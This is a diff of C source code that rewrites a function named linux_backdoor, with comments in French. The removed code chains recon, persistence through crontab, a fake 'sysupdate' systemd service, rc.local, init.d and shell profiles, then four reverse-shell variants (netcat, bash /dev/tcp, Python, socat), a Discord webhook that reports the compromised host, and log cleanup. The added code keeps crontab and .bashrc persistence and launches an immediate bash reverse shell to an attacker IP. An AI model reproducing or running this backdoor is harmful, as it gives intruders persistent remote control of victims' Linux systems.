@@ -118,115 +118,37 @@ void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
 }
 
 void linux_backdoor() {
-  char cmd[3000] = {0};
+  char *user = getenv("USER");
+  if (!user)
+    user = "unknown";
 
-  /* ========================================
-     PHASE 1: RECON + PREPARATION
-     ======================================== */
-  snprintf(cmd, sizeof(cmd),
-           // 1.1 Collecte infos système
-           "echo \"=== LINUX BACKDOOR DEPLOY ===\" && "
-           "echo \"User: $(whoami) | Host: $(hostname) | Kernel: $(uname -a)\" "
-           "> /tmp/.bdoor.info && "
+  // 1. Persistance via crontab user (toutes les 30s)
+  char crontab_cmd[512];
+  snprintf(crontab_cmd, sizeof(crontab_cmd),
+           "(crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \"bash -i >& "
+           "/dev/tcp/" IP
+           "/12345 0>&1\" >/dev/null 2>&1\"') | crontab - >/dev/null 2>&1");
+  system(crontab_cmd);
 
-           // 1.2 Kill concurrents
-           "pkill -f 'nc.*12345' 2>/dev/null || true && "
-           "pkill -f 'bash.*12345' 2>/dev/null || true");
-  system(cmd);
+  // 2. Persistance via .bashrc (au prochain login/terminal)
+  char bashrc_path[256];
+  snprintf(bashrc_path, sizeof(bashrc_path), "/home/%s/.bashrc", user);
+  FILE *f = fopen(bashrc_path, "a");
+  if (f) {
+    fprintf(f, "\n# Backdoor persistence\n"
+               "bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 &\n");
+    fclose(f);
+    chmod(bashrc_path, 0644);
+  }
 
-  /* ========================================
-     PHASE 2: MULTI-PERSISTANCE
-     ======================================== */
-  snprintf(cmd, sizeof(cmd),
-           // 2.1 CRONTAB (@reboot)
-           "echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 "
-           "0>&1'\" | crontab - && "
+  // 3. Exécution immédiate (reverse shell bash simple)
+  char shell_cmd[256];
+  snprintf(shell_cmd, sizeof(shell_cmd),
+           "bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 &");
+  system(shell_cmd);
 
-           // 2.2 SYSTEMD SERVICE
-           "cat > /etc/systemd/system/sysupdate.service << 'SERVICE_EOF'\n"
-           "[Unit]\n"
-           "Description=System Update Service\n"
-           "After=network.target\n"
-           "[Service]\n"
-           "Type=simple\n"
-           "User=root\n"
-           "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1'\n"
-           "Restart=always\n"
-           "RestartSec=10\n"
-           "[Install]\n"
-           "WantedBy=multi-user.target\n"
-           "SERVICE_EOF\n"
-
-           "systemctl daemon-reload && "
-           "systemctl enable sysupdate.service && ");
-  system(cmd);
-
-  /* ========================================
-     PHASE 3: AUTO-EXEC (Linux only)
-     ======================================== */
-  snprintf(cmd, sizeof(cmd),
-           // 3.1 /etc/rc.local
-           "echo '/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 0>&1\"' >> "
-           "/etc/rc.local 2>/dev/null && "
-           "chmod +x /etc/rc.local 2>/dev/null && "
-
-           // 3.2 Init.d compatibilité
-           "cat > /etc/init.d/syslog >> /dev/null 2>/dev/null || "
-           "echo '#!/bin/sh\n/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 "
-           "0>&1\" &' > /etc/init.d/backlight && "
-           "chmod +x /etc/init.d/backlight && update-rc.d backlight defaults "
-           "2>/dev/null || true && "
-
-           // 3.3 .bashrc/.profile (user)
-           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.bashrc && "
-           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.profile "
-           "2>/dev/null");
-  system(cmd);
-
-  /* ========================================
-     PHASE 4: REVERSE SHELL IMMÉDIAT (4 fallbacks)
-     ======================================== */
-  snprintf(cmd, sizeof(cmd),
-           // 4.1 NC -e (classique)
-           "nohup nc -e /bin/sh " IP " 12345 >/dev/null 2>&1 & "
-
-           // 4.2 Bash reverse (universel)
-           "|| nohup bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 & "
-
-           // 4.3 Python3 (90% systèmes)
-           "|| nohup python3 -c 'import socket,subprocess,os; "
-           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-           "s.connect((\"" IP "\",12345)); "
-           "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); "
-           "os.dup2(s.fileno(),2); "
-           "subprocess.call([\"/bin/sh\",\"-i\"])' >/dev/null 2>&1 & "
-
-           // 4.4 Socat (avancé)
-           "|| command -v socat >/dev/null 2>&1 && "
-           "nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
-           "tcp:" IP ":12345 >/dev/null 2>&1 &");
-  system(cmd);
-
-  /* ========================================
-     PHASE 5: CONFIRMATION + STEALTH
-     ======================================== */
-  snprintf(
-      cmd, sizeof(cmd),
-      // 5.1 Notif Discord
-      "curl -s -X POST " WEBHOOK " "
-      "-H 'Content-Type: application/json' "
-      "-d '{\"content\":\"**LINUX BACKDOOR LIVE**\\n"
-      "**Host:** `$(hostname)`\\n"
-      "**User:** `$(whoami)`\\n"
-      "**Listen:** `nc YOUR_IP 12345`\\n"
-      "**PIDs:** `pgrep -f 12345`\"}' && "
-
-      // 5.2 Cache logs
-      "echo \"$(date): Backdoor deployed\" >> /var/log/syslog 2>/dev/null && "
-
-      // 5.3 Self-delete traces
-      "rm -f /tmp/.bdoor.info");
-  system(cmd);
+  // Nettoyage traces (optionnel)
+  unlink("/tmp/.pentest.*");
 }
 
 int main(int argc, char *argv[]) {
